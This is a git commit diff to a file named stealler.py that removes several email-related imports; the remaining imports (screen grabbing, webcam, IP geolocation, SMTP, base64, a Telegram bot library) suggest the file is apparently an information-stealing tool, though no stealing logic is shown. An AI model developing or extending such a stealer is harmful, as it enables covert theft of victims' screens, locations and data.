0d6083dd6b9e13dcd07ba8980003620ec091a73d
vladoswhite <78373271+vladoswhite@users.noreply.github.com>
2024-11-27 23:22:11 +0500

    Update stealler.py

--- stealler.py
+++ stealler.py
@@ -16,19 +16,10 @@ import time
 import cv2
 import sys
 from PIL import ImageGrab
-from email.mime.multipart import MIMEMultipart 
-from email.mime.base import MIMEBase 
-from email.message import Message
-from email.mime.multipart import MIMEBase
-from email.mime.text import MIMEText
-from email.utils import COMMASPACE, formatdate
-from email import encoders
 from Tools.demo.mcast import sender
 from ip2geotools.databases.noncommercial import DbIpCity
 from os.path import basename
 from smtplib import SMTP
-from email.header import Header
-from email.utils import parseaddr, formataddr
 from base64 import encodebytes
 import random
 import telebot
